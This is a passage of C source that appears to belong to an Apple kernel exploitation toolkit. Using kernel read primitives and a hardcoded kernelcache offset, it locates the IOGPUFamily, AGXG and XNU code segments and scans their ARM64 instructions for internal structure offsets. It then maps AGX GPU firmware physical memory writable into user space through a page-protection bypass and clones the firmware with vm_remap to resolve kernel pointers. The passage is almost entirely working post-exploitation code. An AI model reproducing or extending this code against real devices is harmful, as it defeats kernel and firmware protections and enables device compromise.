    *out_buf = buf;
    *out_vaddr = te_vaddr;
    *out_vsize = te_vsize;
    return 0;
}

static int agx_load_iogpu_text_exec(void) {
    if (g_iogpu_te_buf) return 0;

    uint64_t kt = kwrite_get_kern_task_kva();
    if (!kt) return -1;
    uint64_t kc_base = kt - 0x32997D0;

    uint64_t iogpu_mh = kc_find_fileset_entry(kc_base, "com.apple.iokit.IOGPUFamily");
    if (!iogpu_mh) return -2;
    g_iogpu_mh_kva = iogpu_mh;

    return agx_load_kext_text_exec(iogpu_mh, "iogpu",
            &g_iogpu_te_buf, &g_iogpu_te_vaddr, &g_iogpu_te_vsize);
}

static int agx_load_agxg_text_exec(void) {
    if (g_agxg_te_buf) return 0;

    uint64_t kt = kwrite_get_kern_task_kva();
    if (!kt) return -1;
    uint64_t kc_base = kt - 0x32997D0;

    uint64_t agxg_mh = kc_find_fileset_entry_prefix(kc_base, "com.apple.AGXG", 14);
    if (!agxg_mh) return -2;
    g_agxg_mh_kva = agxg_mh;

    return agx_load_kext_text_exec(agxg_mh, "agxg",
            &g_agxg_te_buf, &g_agxg_te_vaddr, &g_agxg_te_vsize);
}

static int agx_load_xnu_text_exec(void) {
    if (g_xnu_te_buf) return 0;

    uint64_t kt = kwrite_get_kern_task_kva();
    if (!kt) return -1;
    uint64_t kc_base = kt - 0x32997D0;

    uint64_t xnu_mh = 0;
    for (uint64_t off = 0; off <= 0x10000; off += 0x4000) {
        uint8_t hdr[16];
        if (kc_kread(kc_base + off, hdr, 16) != KERN_SUCCESS) continue;
        uint32_t magic = *(uint32_t *)hdr;
        uint32_t ft    = *(uint32_t *)(hdr + 12);
        if (magic == 0xfeedfacf) {
            kwlog("[xnu] MH @ kc+0x%llx ft=%u\n", (unsigned long long)off, ft);
            if (ft == 2) { xnu_mh = kc_base + off; break; }
        }
    }
    if (!xnu_mh) {
        kwlog("[xnu] FAIL: filetype-2 MH not found\n");
        return -2;
    }
    g_xnu_mh_kva = xnu_mh;

    return agx_load_kext_text_exec(xnu_mh, "xnu",
            &g_xnu_te_buf, &g_xnu_te_vaddr, &g_xnu_te_vsize);
}

static uint64_t resolve_adrp_target(const uint32_t *buf, long count, long idx,
                                    uint64_t insn_kva) {
    if (idx < 0 || idx >= count) return 0;
    uint32_t insn = buf[idx];
    uint64_t base;
    if ((insn & 0x9f000000) == 0x90000000) {
        uint64_t immhi = (insn >> 5) & 0x7ffff;
        uint64_t immlo = (insn >> 29) & 0x3;
        int64_t imm21 = (int64_t)((immhi << 2) | immlo);
        if (imm21 & 0x100000) imm21 |= 0xfffffffffff00000LL;
        base = (insn_kva & ~0xfffULL) + ((uint64_t)imm21 << 12);
    } else if ((insn & 0x9f000000) == 0x10000000) {
        uint64_t immhi = (insn >> 5) & 0x7ffff;
        uint64_t immlo = (insn >> 29) & 0x3;
        int64_t imm21 = (int64_t)((immhi << 2) | immlo);
        if (imm21 & 0x100000) imm21 |= 0xfffffffffff00000LL;
        base = insn_kva + (uint64_t)imm21;
    } else {
        return 0;
    }
    uint32_t rd = insn & 0x1f;

    for (long i = idx + 1; i < count && i < idx + 8; i++) {
        uint32_t i2 = buf[i];
        if ((i2 & 0x7f000000) == 0x11000000 && ((i2 >> 5) & 0x1f) == rd) {
            uint64_t imm12 = (i2 >> 10) & 0xfff;
            if (i2 & 0x00c00000) imm12 <<= 12;
            return base + imm12;
        }
        if ((i2 & 0xbfc00000) == 0xb9400000 && ((i2 >> 5) & 0x1f) == rd) {
            uint64_t imm12 = ((i2 >> 10) & 0xfff) << (i2 >> 30);
            return base + imm12;
        }
    }
    return base;
}

int agx_kcache_pattern1_test(void) {
    kwlog("[kcb2] === Pattern scan: PATTERNS 1,2,3 SCAN ===\n");
    memset(&g_agx_off, 0, sizeof(g_agx_off));

    if (agx_load_iogpu_text_exec() != 0) {
        kwlog("[kcb2] FAIL: load IOGPU __TEXT_EXEC\n");
        return -1;
    }
    if (agx_load_agxg_text_exec() != 0) {
        kwlog("[kcb2] FAIL: load AGXG __TEXT_EXEC\n");
        return -2;
    }

    {
        static const uint32_t pat[4]  = { 0xf9401048, 0xb9400100, 0xf9400008, 0xf9400000 };
        static const uint32_t mask[4] = { 0xffffffff, 0xffffffe0, 0xffc0001f, 0xffc0001f };
        long idx = scan_insn_pattern(g_iogpu_te_buf, g_iogpu_te_vsize / 4,
                                     pat, mask, 4);
        if (idx < 0) { kwlog("[kcb2] P1 NOT FOUND\n"); return -3; }
        uint32_t insn2 = g_iogpu_te_buf[idx + 2];
        g_agx_off.v42  = extract_ldr_str_imm(insn2);
        g_agx_off.have[0] = 1;
        kwlog("[kcb2] P1 idx=%ld (kva=0x%llx) insn[2]=0x%08x -> v4[42]=0x%x\n",
                idx, (unsigned long long)(g_iogpu_te_vaddr + (uint64_t)idx * 4),
                insn2, g_agx_off.v42);
    }

    {
        static const uint32_t pat_movk  = 0xf2f5f020;
        static const uint32_t mask_movk = 0xffffffe0;
        long idx = scan_insn_pattern(g_iogpu_te_buf, g_iogpu_te_vsize / 4,
                                     &pat_movk, &mask_movk, 1);
        if (idx < 0) { kwlog("[kcb2] P2 MOVK NOT FOUND\n"); return -4; }
        kwlog("[kcb2] P2 MOVK at idx=%ld insn=0x%08x -- walking for STR XZR...\n",
                idx, g_iogpu_te_buf[idx]);

        long count = (long)(g_iogpu_te_vsize / 4);
        long found = -1;
        for (long i = idx; i < count && i < idx + 256; i++) {
            if ((g_iogpu_te_buf[i] & 0xffc0001f) == 0xf900001f) {
                found = i;
                break;
            }
        }
        if (found < 0) { kwlog("[kcb2] P2 STR XZR not found within 256 insns\n"); return -5; }
        uint32_t insn = g_iogpu_te_buf[found];
        g_agx_off.v43 = extract_ldr_str_imm(insn);
        g_agx_off.have[1] = 1;
        kwlog("[kcb2] P2 STR XZR at idx=%ld (Delta%ld) insn=0x%08x -> v4[43]=0x%x\n",
                found, found - idx, insn, g_agx_off.v43);
    }

    {
        static const uint32_t pat[5]  = { 0xf9400000, 0xb4000000, 0xf9400000, 0xb9400000, 0x34000000 };
        static const uint32_t mask[5] = { 0xffc00000, 0xff000000, 0xffc00000, 0xffc00000, 0xff000000 };
        long idx = scan_insn_pattern(g_agxg_te_buf, g_agxg_te_vsize / 4,
                                     pat, mask, 5);
        if (idx < 0) { kwlog("[kcb2] P3 NOT FOUND in AGXG\n"); return -6; }
        uint32_t i0 = g_agxg_te_buf[idx + 0];
        uint32_t i2 = g_agxg_te_buf[idx + 2];
        uint32_t i3 = g_agxg_te_buf[idx + 3];
        g_agx_off.v46 = extract_ldr_str_imm(i0);
        g_agx_off.v44 = extract_ldr_str_imm(i2);
        g_agx_off.v45 = extract_ldr_str_imm(i3);
        g_agx_off.have[4] = 1;
        g_agx_off.have[2] = 1;
        g_agx_off.have[3] = 1;
        kwlog("[kcb2] P3 idx=%ld (kva=0x%llx)\n",
                idx, (unsigned long long)(g_agxg_te_vaddr + (uint64_t)idx * 4));
        kwlog("[kcb2]   insns: [0]=0x%08x [1]=0x%08x [2]=0x%08x [3]=0x%08x [4]=0x%08x\n",
                i0, g_agxg_te_buf[idx + 1], i2, i3, g_agxg_te_buf[idx + 4]);
        kwlog("[kcb2]   -> v4[46]=0x%x v4[44]=0x%x v4[45]=0x%x\n",
                g_agx_off.v46, g_agx_off.v44, g_agx_off.v45);
    }

    long p4_idx = -1;
    {
        static const uint32_t pat[6]  = {
            0x52800008,
            0xb8686809,
            0x11040129,
            0xb8286809,
            0x52800008,
            0x8b000000,
        };
        static const uint32_t mask[6] = {
            0xffe0001f,
            0xfffffc1f,
            0xffffffff,
            0xfffffc1f,
            0xffe0001f,
            0xffe0fc00,
        };
        p4_idx = scan_insn_pattern(g_agxg_te_buf, g_agxg_te_vsize / 4,
                                   pat, mask, 6);
        if (p4_idx < 0) { kwlog("[kcb2] P4 NOT FOUND in AGXG\n"); return -7; }
        uint32_t i0 = g_agxg_te_buf[p4_idx];
        g_agx_off.v49 = (i0 >> 5) & 0xFFFF;
        g_agx_off.have[7] = 1;
        kwlog("[kcb2] P4 idx=%ld (kva=0x%llx) insn[0]=0x%08x -> v4[49]=0x%x\n",
                p4_idx, (unsigned long long)(g_agxg_te_vaddr + (uint64_t)p4_idx * 4),
                i0, g_agx_off.v49);
    }

    {
        long count = (long)(g_agxg_te_vsize / 4);
        int hits = 0;
        long mov2_idx = -1;
        for (int step = 0; step < 29; step++) {
            long sample_idx = p4_idx + 1 - step;
            if (sample_idx < 0 || sample_idx >= count) break;
            uint32_t insn = g_agxg_te_buf[sample_idx];
            if ((insn & 0xffe0001f) == 0x52800008) {
                hits++;
                if (hits == 2) {
                    mov2_idx = sample_idx;
                    g_agx_off.v47 = (insn >> 5) & 0xFFFF;
                    g_agx_off.have[5] = 1;
                    kwlog("[kcb2] P5 2nd MOV W8 at idx=%ld (Delta%ld) insn=0x%08x -> v4[47]=0x%x\n",
                            sample_idx, sample_idx - p4_idx, insn, g_agx_off.v47);
                    break;
                }
            }
        }
        if (mov2_idx < 0) { kwlog("[kcb2] P5 2nd MOV W8 not found in 29-insn back-window\n"); return -8; }

        long marker_idx = -1;
        for (long i = mov2_idx; i < count && i < mov2_idx + 1024; i++) {
            if (g_agxg_te_buf[i] == 0xf2e63531) { marker_idx = i; break; }
        }
        if (marker_idx < 0) { kwlog("[kcb2] P5 marker 0xF2E63531 not found within 1024 insns\n"); return -9; }
        if (marker_idx + 3 >= count) { kwlog("[kcb2] P5 marker+12 out of range\n"); return -10; }
        uint32_t imm_insn = g_agxg_te_buf[marker_idx + 3];
        g_agx_off.v48 = extract_ldr_str_imm(imm_insn);
        g_agx_off.have[6] = 1;
        kwlog("[kcb2] P5 marker at idx=%ld (Delta%ld from MOV2) insn[+3]=0x%08x -> v4[48]=0x%x\n",
                marker_idx, marker_idx - mov2_idx, imm_insn, g_agx_off.v48);
    }

    {
        static const uint32_t pat[7]  = {
            0xf900001f,
            0xb900001f,
            0xb900001f,
            0x00000000,
            0x00000000,
            0x00000000,
            0x14000000,
        };
        static const uint32_t mask[7] = {
            0xfffffc1f,
            0xfffffc1f,
            0xfffffc1f,
            0x00000000,
            0x00000000,
            0x00000000,
            0xfc000000,
        };
        long idx = scan_insn_pattern(g_iogpu_te_buf, g_iogpu_te_vsize / 4,
                                     pat, mask, 7);
        if (idx < 0) { kwlog("[kcb2] P6 NOT FOUND in IOGPU\n"); return -11; }

        long count = (long)(g_iogpu_te_vsize / 4);
        long bl_idx = -1;
        for (long i = idx; i < count && i < idx + 256; i++) {
            if ((g_iogpu_te_buf[i] >> 26) == 37) { bl_idx = i; break; }
        }
        if (bl_idx < 0) { kwlog("[kcb2] P6 BL not found within 256 insns\n"); return -12; }
        if (bl_idx < 2) { kwlog("[kcb2] P6 BL too close to start\n"); return -13; }
        uint32_t imm_insn = g_iogpu_te_buf[bl_idx - 2];
        g_agx_off.v50 = extract_ldr_str_imm(imm_insn);
        g_agx_off.have[8] = 1;
        kwlog("[kcb2] P6 match=%ld BL=%ld (Delta%ld) insn[BL-2]=0x%08x -> v4[50]=0x%x\n",
                idx, bl_idx, bl_idx - idx, imm_insn, g_agx_off.v50);
    }

    {
        static const uint32_t pat[5]  = {
            0xf9000000,
            0xb4000000,
            0x00000000,
            0x94000000,
            0xf9000000,
        };
        static const uint32_t mask[5] = {
            0xffc0001f,
            0xff00001f,
            0x00000000,
            0xfc000000,
            0xffc0001f,
        };
        long idx = scan_insn_pattern(g_iogpu_te_buf, g_iogpu_te_vsize / 4,
                                     pat, mask, 5);
        if (idx < 0) { kwlog("[kcb2] P7 NOT FOUND in IOGPU\n"); return -14; }
        uint32_t i0 = g_iogpu_te_buf[idx];
        g_agx_off.v51 = extract_ldr_str_imm(i0);
        g_agx_off.have[9] = 1;
        kwlog("[kcb2] P7 idx=%ld insn[0]=0x%08x -> v4[51]=0x%x\n",
                idx, i0, g_agx_off.v51);
    }

    {
        static const uint32_t pat[2]  = { 0x11000000, 0x29000000 };
        static const uint32_t mask[2] = { 0xffc00000, 0xffc00000 };
        long idx = scan_insn_pattern(g_iogpu_te_buf, g_iogpu_te_vsize / 4,
                                     pat, mask, 2);
        if (idx < 0) {
            kwlog("[kcb2] P8 NOT FOUND in IOGPU -- v4[52]=0 (non-fatal)\n");
            g_agx_off.v52 = 0;
        } else if (idx + 3 >= (long)(g_iogpu_te_vsize / 4)) {
            kwlog("[kcb2] P8 match+3 out of range -- v4[52]=0\n");
            g_agx_off.v52 = 0;
        } else {
            uint32_t i3 = g_iogpu_te_buf[idx + 3];
            g_agx_off.v52 = extract_ldr_str_imm(i3);
            g_agx_off.have[10] = 1;
            kwlog("[kcb2] P8 idx=%ld insn[+3]=0x%08x -> v4[52]=0x%x\n",
                    idx, i3, g_agx_off.v52);
        }
    }

    {
        if (agx_load_xnu_text_exec() != 0) {
            kwlog("[kcb2] P9 SKIP: failed to load XNU __TEXT_EXEC\n");
            g_agx_off.v53 = 0;
        } else {
            static const uint32_t pat[2]  = { 0xf9400008, 0x8b020108 };
            static const uint32_t mask[2] = { 0xffc003ff, 0xffffffff };
            long idx = scan_insn_pattern(g_xnu_te_buf, g_xnu_te_vsize / 4,
                                         pat, mask, 2);
            if (idx < 0) {
                kwlog("[kcb2] P9 NOT FOUND in XNU __TEXT_EXEC -- v4[53]=0\n");
                g_agx_off.v53 = 0;
            } else {
                uint32_t i0 = g_xnu_te_buf[idx];
                g_agx_off.v53 = extract_ldr_str_imm(i0);
                g_agx_off.have[11] = 1;
                kwlog("[kcb2] P9 idx=%ld insn[0]=0x%08x -> v4[53]=0x%x\n",
                        idx, i0, g_agx_off.v53);
            }
        }
    }

    {
        static const uint32_t pat[4]  = { 0xf2f9b431, 0xdac10a30, 0xf9000010, 0x3904c01f };
        static const uint32_t mask[4] = { 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff };
        long match_idx = scan_insn_pattern(g_agxg_te_buf, g_agxg_te_vsize / 4,
                                           pat, mask, 4);
        if (match_idx < 0) {
            kwlog("[kcb2] P10 NOT FOUND in AGXG -- v4[27]=0\n");
            g_agx_off.v27 = 0;
        } else {
            kwlog("[kcb2] P10 match idx=%ld (kva=0x%llx) -- walking back for ADRP...\n",
                    match_idx,
                    (unsigned long long)(g_agxg_te_vaddr + (uint64_t)match_idx * 4));
            uint64_t resolved = 0;
            for (int step = 0; step < 29; step++) {
                long sample_idx = match_idx - step;
                if (sample_idx < 0) break;
                uint32_t insn = g_agxg_te_buf[sample_idx];
                if ((insn & 0x1f000000) == 0x10000000) {
                    uint64_t insn_kva = g_agxg_te_vaddr + (uint64_t)sample_idx * 4;
                    uint64_t r = resolve_adrp_target(g_agxg_te_buf,
                                                    (long)(g_agxg_te_vsize / 4),
                                                    sample_idx, insn_kva);
                    kwlog("[kcb2]   step=%d idx=%ld insn=0x%08x kva=0x%llx -> resolve=0x%llx\n",
                            step, sample_idx, insn,
                            (unsigned long long)insn_kva,
                            (unsigned long long)r);
                    if (r) { resolved = r; break; }
                }
            }
            if (resolved) {
                g_agx_off.v27 = resolved;
                g_agx_off.have[12] = 1;
                kwlog("[kcb2] P10 -> v4[27] = 0x%llx\n", (unsigned long long)resolved);
            } else {
                kwlog("[kcb2] P10 no ADRP resolved in 29-insn back-window -- v4[27]=0\n");
                g_agx_off.v27 = 0;
            }
        }
    }

    kwlog("[kcb2] === Kcache scan COMPLETE -- 13/13 attempts done ===\n");
    kwlog("[kcb2] v4: 42=0x%x 43=0x%x 44=0x%x 45=0x%x 46=0x%x 47=0x%x 48=0x%x 49=0x%x 50=0x%x 51=0x%x 52=0x%x 53=0x%x\n",
            g_agx_off.v42, g_agx_off.v43, g_agx_off.v44, g_agx_off.v45,
            g_agx_off.v46, g_agx_off.v47, g_agx_off.v48, g_agx_off.v49,
            g_agx_off.v50, g_agx_off.v51, g_agx_off.v52, g_agx_off.v53);
    kwlog("[kcb2]     v27 = 0x%llx\n", (unsigned long long)g_agx_off.v27);
    int total_have = 0;
    for (int i = 0; i < 14; i++) if (g_agx_off.have[i]) total_have++;
    kwlog("[kcb2] %d of 13 offsets verified\n", total_have);
    return 0;
}

int agx_kcache_locate_iogpu_test(void) {
    kwlog("[kcb] === Kext locate: LOCATE IOGPU KEXT ===\n");

    uint64_t kt = kwrite_get_kern_task_kva();
    if (!kt) {
        kwlog("[kcb] FAIL: no kern_task kva\n");
        return -1;
    }
    uint64_t kc_base = kt - 0x32997D0;
    kwlog("[kcb] kt_kva=0x%llx -> kc_base=0x%llx\n",
            (unsigned long long)kt, (unsigned long long)kc_base);

    uint64_t iogpu_mh = kc_find_fileset_entry(kc_base, "com.apple.iokit.IOGPUFamily");
    if (!iogpu_mh) {
        kwlog("[kcb] FAIL: IOGPUFamily not located in fileset\n");
        return -2;
    }

    uint8_t hdr[32];
    if (kc_kread(iogpu_mh, hdr, 32) == KERN_SUCCESS) {
        uint32_t magic = *(uint32_t *)hdr;
        uint32_t ft    = *(uint32_t *)(hdr + 12);
        uint32_t ncmds = *(uint32_t *)(hdr + 16);
        kwlog("[kcb] IOGPU MH: magic=0x%x ft=%u ncmds=%u\n",
                magic, ft, ncmds);

        uint64_t cmd_off = iogpu_mh + 32;
        int dumped = 0;
        for (uint32_t i = 0; i < ncmds && i < 64 && dumped < 8; i++) {
            uint8_t lch[8];
            if (kc_kread(cmd_off, lch, 8) != KERN_SUCCESS) break;
            uint32_t c  = *(uint32_t *)lch;
            uint32_t cs = *(uint32_t *)(lch + 4);
            if (cs == 0 || cs > 0x1000) break;
            if (c == 0x19) {
                uint8_t seg[72];
                if (kc_kread(cmd_off, seg, 72) == KERN_SUCCESS) {
                    char segname[17];
                    memcpy(segname, seg + 8, 16);
                    segname[16] = 0;
                    uint64_t vmaddr  = *(uint64_t *)(seg + 24);
                    uint64_t vmsize  = *(uint64_t *)(seg + 32);
                    kwlog("[kcb]   seg[%d] '%s' vmaddr=0x%llx vmsize=0x%llx\n",
                            dumped, segname,
                            (unsigned long long)vmaddr, (unsigned long long)vmsize);
                    dumped++;
                }
            }
            cmd_off += cs;
        }
    }

    kwlog("[kcb] === Kext locate OK ===\n");
    return 0;
}
#pragma mark - firmware bring-up: AGX firmware MMIO probe

int agx_bringup_pa_select(void) {
    kwlog("[bringup] === AGX FIRMWARE MMIO PROBE ===\n");

    const uint64_t MMIO_PA = 0x206050000ULL;
    const uint64_t kptr_mask = 0xFFFFFF8000000000ULL;
    const uint64_t mask_kern = 0xFFFFFFFFEULL;

    kwlog("[bringup] flag check: ctx[0]&0x4000000 = 0 (we use PA 0x206050000)\n");
    kwlog("[bringup] flag check: ctx[0]&0x5000000 = 0 (we use mask 0xFFFFFFFFE)\n");

    ppl_page_t fw_page;
    memset(&fw_page, 0, sizeof(fw_page));
    kwlog("[bringup] mapping AGX firmware MMIO at 0x%llx...\n",
            (unsigned long long)MMIO_PA);
    int r = ppl_make_writable_page(MMIO_PA, &fw_page);
    if (r) {
        kwlog("[bringup] FAIL: ppl_make_writable_page(0x%llx) = %d\n",
                (unsigned long long)MMIO_PA, r);
        return -1;
    }
    kwlog("[bringup] mapped at user VA 0x%llx (kobj=0x%llx)\n",
            (unsigned long long)fw_page.mapped_addr,
            (unsigned long long)fw_page.kobj_addr);

    volatile uint64_t *mmio = (volatile uint64_t *)(uintptr_t)fw_page.mapped_addr;
    kwlog("[bringup] reading 8 bytes from MMIO+0...\n");
    uint64_t v42 = mmio[0];
    kwlog("[bringup] *(0x206050000+0) = 0x%llx\n", (unsigned long long)v42);

    uint64_t v45 = v42 & mask_kern;
    if (v45 & 0x0080000000000000ULL) v45 |= 0xFFFFFF8000000000ULL;
    kwlog("[bringup] masked (v45 = v42 & 0xFFFFFFFFE) = 0x%llx\n",
            (unsigned long long)v45);

    ppl_writable_page_free(&fw_page);

    g_agx_fw.firmware_pa = v45;
    g_agx_fw.firmware_kptr_mask = kptr_mask;

    kwlog("[bringup] pte_scan_for_physaddr(firmware_pa=0x%llx)...\n",
            (unsigned long long)v45);
    uint64_t fw_pa_kva = pte_scan_for_physaddr(v45);
    if (!fw_pa_kva) {
        kwlog("[bringup] FAIL: pte_scan(firmware_pa)=0\n");
        return -2;
    }
    g_agx_fw.firmware_pa_kva = fw_pa_kva;
    kwlog("[bringup] firmware_pa 0x%llx -> KVA 0x%llx -> v4[31]\n",
            (unsigned long long)v45, (unsigned long long)fw_pa_kva);
    kwlog("[bringup] === OK ===\n");

    kwlog("[bringup] === AGX FIRMWARE MAGIC WALK ===\n");
    kwlog("[bringup] mapping firmware PA 0x%llx...\n", (unsigned long long)v45);

    ppl_page_t fw2;
    memset(&fw2, 0, sizeof(fw2));
    int r2 = ppl_make_writable_page(v45, &fw2);
    if (r2) {
        kwlog("[bringup] FAIL: ppl_make_writable_page(0x%llx) = %d\n",
                (unsigned long long)v45, r2);
        return -2;
    }
    kwlog("[bringup] firmware mapped at user VA 0x%llx\n",
            (unsigned long long)fw2.mapped_addr);

    volatile uint64_t *fw = (volatile uint64_t *)(uintptr_t)fw2.mapped_addr;
    long page_qwords = (long)(vm_page_size / 8);
    long magic_idx = -1;
    for (long i = 0; i < page_qwords; i++) {
        if (fw[i] == 0x7777777777777700ULL) { magic_idx = i; break; }
    }
    if (magic_idx < 0) {
        kwlog("[bringup] FAIL: magic 0x7777777777777700 not found in %ld qwords\n",
                page_qwords);
        ppl_writable_page_free(&fw2);
        return -3;
    }
    kwlog("[bringup] magic found at qword idx %ld (offset 0x%lx) of mapped page\n",
            magic_idx, magic_idx * 8);

    if (magic_idx < 4 || magic_idx + 8 >= page_qwords) {
        kwlog("[bringup] FAIL: magic too close to page edge (idx=%ld)\n", magic_idx);
        ppl_writable_page_free(&fw2);
        return -4;
    }

    uint64_t v50 = fw[magic_idx - 4];
    uint64_t v_minus_4 = fw[magic_idx - 3];
    uint64_t v_post = fw[magic_idx + 1];
    uint64_t v_plus_7 = fw[magic_idx + 8];
    uint64_t v51 = v_minus_4 - v50;

    kwlog("[bringup] *(v48-5)  v50    = 0x%llx (vaddr)\n",  (unsigned long long)v50);
    kwlog("[bringup] *(v48-4)         = 0x%llx (vend)\n",   (unsigned long long)v_minus_4);
    kwlog("[bringup] *v48     post    = 0x%llx\n",           (unsigned long long)v_post);
    kwlog("[bringup] v48[7]           = 0x%llx\n",           (unsigned long long)v_plus_7);
    kwlog("[bringup] v51 = vend-vaddr = 0x%llx (size)\n",   (unsigned long long)v51);
    kwlog("[bringup] kptr_mask v41    = 0x%llx\n",           (unsigned long long)kptr_mask);
    kwlog("[bringup] v50 - v41        = 0x%llx (KVA-relative)\n",
            (unsigned long long)(v50 - kptr_mask));

    ppl_writable_page_free(&fw2);

    g_agx_fw.firmware_v48_7     = v_plus_7;
    g_agx_fw.firmware_post_qw   = v_post;
    g_agx_fw.firmware_kptr_mask = kptr_mask;
    g_agx_fw.firmware_vaddr     = v50;
    g_agx_fw.firmware_kva_off   = v50 - kptr_mask;
    g_agx_fw.firmware_func_size = v51;
    kwlog("[bringup] === OK ===\n");
    return 0;
}

#pragma mark - firmware bring-up: vm_allocate + vm_remap firmware clone (binary sub_16530 lines 902-947)

int agx_bringup_clone_firmware(void) {
    kwlog("[bringup] === vm_allocate + vm_remap firmware clone ===\n");

    if (g_agx_fw.firmware_pa == 0 || g_agx_fw.firmware_kva_off == 0) {
        kwlog("[bringup] FAIL: g_agx_fw not populated (run firmware bring-up first)\n");
        return -1;
    }

    const uint64_t v52 = g_agx_fw.firmware_pa;
    const uint64_t v53 = g_agx_fw.firmware_kva_off;
    const uint32_t v54 = (uint32_t)vm_page_size;

    kwlog("[bringup] v52 firmware PA   = 0x%llx\n", (unsigned long long)v52);
    kwlog("[bringup] v53 clone size    = 0x%llx (== firmware_kva_off)\n",
            (unsigned long long)v53);
    kwlog("[bringup] v54 vm_page_size  = 0x%x\n", (unsigned)v54);

    vm_address_t address = 0;
    kern_return_t kr = vm_allocate(mach_task_self_, &address,
                                    (vm_size_t)v53, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        kwlog("[bringup] FAIL vm_allocate(0x%llx) -> 0x%x\n",
                (unsigned long long)v53, kr);
        return -2;
    }
    kwlog("[bringup] vm_allocate -> user VA 0x%llx (size 0x%llx)\n",
            (unsigned long long)address, (unsigned long long)v53);

    long v57;
    if (v53 < v54) {
        kwlog("[bringup] v53 < v54 -- skipping remap loop (binary fall-through path)\n");
        v57 = 0;
    } else {
        uint64_t div = v53 / v54;
        v57 = (div <= 1) ? 1 : (long)div;
        kwlog("[bringup] cloning %ld pages of 0x%x bytes each\n", v57, (unsigned)v54);
    }

    ppl_page_t *maps = NULL;
    if (v57 > 0) {
        maps = (ppl_page_t *)calloc((size_t)v57, sizeof(ppl_page_t));
        if (!maps) {
            kwlog("[bringup] FAIL calloc page_maps(%ld)\n", v57);
            vm_deallocate(mach_task_self_, address, (vm_size_t)v53);
            return -3;
        }
    }

    for (long v56 = 0; v56 < v57; v56++) {
        uint64_t src_pa = v52 + (uint64_t)v56 * (uint64_t)v54;

        int r = ppl_make_writable_page(src_pa, &maps[v56]);
        if (r) {
            kwlog("[bringup] FAIL ppl_make_writable_page PA=0x%llx -> %d (iter %ld)\n",
                    (unsigned long long)src_pa, r, v56);
            for (long j = 0; j < v56; j++) ppl_writable_page_free(&maps[j]);
            free(maps);
            vm_deallocate(mach_task_self_, address, (vm_size_t)v53);
            return -4;
        }

        vm_address_t target_address =
                (vm_address_t)((uint64_t)address + (uint64_t)v56 * (uint64_t)v54);
        vm_address_t src_va = (vm_address_t)maps[v56].mapped_addr;

        vm_prot_t cur_prot = VM_PROT_READ | VM_PROT_WRITE;
        vm_prot_t max_prot = VM_PROT_READ | VM_PROT_WRITE;

        kr = vm_remap(mach_task_self_,
                      &target_address,
                      (vm_size_t)v54,
                      (vm_address_t)0,
                      VM_FLAGS_OVERWRITE,
                      mach_task_self_,
                      src_va,
                      FALSE,
                      &cur_prot,
                      &max_prot,
                      VM_INHERIT_DEFAULT);
        if (kr != KERN_SUCCESS) {
            kwlog("[bringup] FAIL vm_remap target=0x%llx src=0x%llx -> 0x%x (iter %ld)\n",
                    (unsigned long long)target_address,
                    (unsigned long long)src_va, kr, v56);
            for (long j = 0; j <= v56; j++) ppl_writable_page_free(&maps[j]);
            free(maps);
            vm_deallocate(mach_task_self_, address, (vm_size_t)v53);
            return -5;
        }
        if (v56 < 2 || v56 == v57 - 1) {
            kwlog("[bringup]   iter %ld: PA=0x%llx -> src_va=0x%llx -> target=0x%llx\n",
                    v56, (unsigned long long)src_pa,
                    (unsigned long long)src_va,
                    (unsigned long long)target_address);
        }
    }

    g_agx_fw.clone_user_va = (uint64_t)address;
    g_agx_fw.clone_size    = v53;
    g_agx_fw.page_maps     = maps;
    g_agx_fw.page_count    = v57;

    if (v57 > 0) {
        volatile uint64_t *clone = (volatile uint64_t *)(uintptr_t)address;
        uint64_t at_850 = clone[0x850 / 8];
        kwlog("[bringup] clone[0x850] = 0x%llx (expected 0x7777777777777700)\n",
                (unsigned long long)at_850);
        if (at_850 == 0x7777777777777700ULL) {
            kwlog("[bringup] === OK ===\n");
        } else {
            kwlog("[bringup] WARN clone[0x850] mismatch\n");
        }
    }
    return 0;
}

#pragma mark - resolve: read 2 firmware-resident pointers from clone, pte_scan to PAs

int agx_resolve_pointers(void) {
    kwlog("[resolve] === read 2 firmware pointers from clone, pte_scan ===\n");

    if (!g_agx_fw.clone_user_va || !g_agx_fw.page_count) {
        kwlog("[resolve] FAIL: g_agx_fw.clone not present (run firmware clone first)\n");
        return -1;
    }

    const uint64_t kpm = g_agx_fw.firmware_kptr_mask;
    const uint64_t off_post = g_agx_fw.firmware_post_qw - kpm;
    const uint64_t off_v48_7 = g_agx_fw.firmware_v48_7   - kpm;

    if (off_post + 8 > g_agx_fw.clone_size ||
        off_v48_7 + 8 > g_agx_fw.clone_size) {
        kwlog("[resolve] FAIL: offset out of clone (post=0x%llx v48_7=0x%llx size=0x%llx)\n",
                (unsigned long long)off_post,
                (unsigned long long)off_v48_7,
                (unsigned long long)g_agx_fw.clone_size);
        return -2;
    }

    uint8_t *clone_base = (uint8_t *)(uintptr_t)g_agx_fw.clone_user_va;
    uint8_t *p66 = clone_base + off_post;
    uint8_t *p67 = clone_base + off_v48_7;

    kwlog("[resolve] off_post  = 0x%llx  (firmware_post_qw  KVA 0x%llx)\n",
            (unsigned long long)off_post,
            (unsigned long long)g_agx_fw.firmware_post_qw);
    kwlog("[resolve] off_v48_7 = 0x%llx  (firmware_v48_7    KVA 0x%llx)\n",
            (unsigned long long)off_v48_7,
            (unsigned long long)g_agx_fw.firmware_v48_7);
    kwlog("[resolve] p66=%p p67=%p clone_base=%p clone_size=0x%llx\n",
            p66, p67, clone_base, (unsigned long long)g_agx_fw.clone_size);

    long page_post   = (long)(off_post   / vm_page_size);
    long page_v48_7  = (long)(off_v48_7  / vm_page_size);
    uint64_t in_page_off_post  = off_post   - (uint64_t)page_post  * vm_page_size;
    uint64_t in_page_off_v48_7 = off_v48_7  - (uint64_t)page_v48_7 * vm_page_size;
    kwlog("[resolve] page_post=%ld (in-page off 0x%llx) page_v48_7=%ld (in-page off 0x%llx)\n",
            page_post,  (unsigned long long)in_page_off_post,
            page_v48_7, (unsigned long long)in_page_off_v48_7);

    kwlog("[resolve] pre-touch p66[0] (page 1)...\n");
    volatile uint8_t pt66 = p66[0];
    kwlog("[resolve] pre-touch p66[0] = 0x%02x OK\n", pt66);

    kwlog("[resolve] reading 8 bytes from p66 (page 1)...\n");
    uint64_t v64 = 0;
    for (int i = 0; i < 8; i++) v64 |= ((uint64_t)p66[i]) << (i * 8);
    kwlog("[resolve] v64 = 0x%llx\n", (unsigned long long)v64);

    kwlog("[resolve] pre-touch p67[0] (page 22)...\n");
